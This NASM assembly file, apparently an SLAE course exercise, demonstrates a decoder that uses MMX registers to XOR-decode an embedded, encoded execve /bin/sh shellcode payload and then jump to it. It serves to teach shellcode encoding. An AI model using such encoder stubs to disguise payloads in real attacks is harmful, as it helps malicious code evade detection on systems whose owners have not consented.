; File: mmx-xor-decoder.nasm
; Author: Kevin Ren, originally Professor Viviek of SLAE
; Purpose: to demostrate a xor decoder using mmx registers/instruction sets

; NOTE: mmx instruction set moves data in 8 bytes/qword
; edditted using 64 bit mode and rip rel address


global _start

section .text
_start: 
	jmp short decoder
	decoder_value: db 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa
	shellcode: db 0xe2,0x9b,0x6a,0xe2,0x9b,0x71,0x1a,0x91,0xf9,0xe2,0x13,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xfb,0xe2,0x23,0x4d,0xf9,0xfd,0xe2,0x23,0x4c,0xf9,0xe2,0x23,0x48,0xa5,0xaf

decoder:				; setup for decoding
	lea rdi, [rel decoder_value]	; decoder-value address into rdi
	lea rsi, [rel shellcode]	; encoded shellcode address loaded into rsi
	xor rcx, rcx
	mov cl, 5			; mmx instruction sets move data in qword or 8 bytes
					; 35 bytes / 8 bytes per instruction <= 5 cycles of instruction
					; the leftover byte will never be reached in a success execve execution

decode:
	movq mm0, qword [rdi]		; moving a qword of data from edi address to mm0 register
	movq mm1, qword [rsi]		; moving a qword of shellcode from esi address to mm1

	pxor mm0, mm1			; xor 8 bytes using pxor

	movq qword [rsi], mm0		; moving result back to rsi for a qword replacment

	add rsi, 0x8			; increment our shellcode by 8 byte offsets

	loop decode			; repeat decode ecx amount of times

	jmp short shellcode		; pass control over to decoded shellcode


